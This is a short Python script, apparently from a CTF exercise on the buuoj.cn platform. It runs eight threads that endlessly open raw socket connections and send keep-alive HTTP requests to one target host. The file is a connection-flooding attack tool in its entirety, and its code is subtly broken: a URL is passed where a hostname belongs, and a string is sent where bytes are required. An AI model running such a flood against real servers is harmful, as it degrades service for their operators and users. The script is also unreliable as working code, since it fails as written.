# coding: UTF-8
# Author: orange@chroot.org
#
 
import requests
import socket
import time
from multiprocessing.dummy import Pool as ThreadPool
try:
    requests.packages.urllib3.disable_warnings()
except:
    pass
 
 
def run(i):
    while 1:
        HOST = 'http://ac8e05a5-85d6-4545-b83f-d012c77d8af7.node4.buuoj.cn'
        PORT = 81
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.sendall(
            'GET / HTTP/1.1\nHost: http://ac8e05a5-85d6-4545-b83f-d012c77d8af7.node4.buuoj.cn:81\nConnection: Keep-Alive\n\n')
        # s.close()
        print("ok")
        time.sleep(0.5)
 
 
i = 8
pool = ThreadPool(i)
result = pool.map_async(run, range(i)).get(0xffff)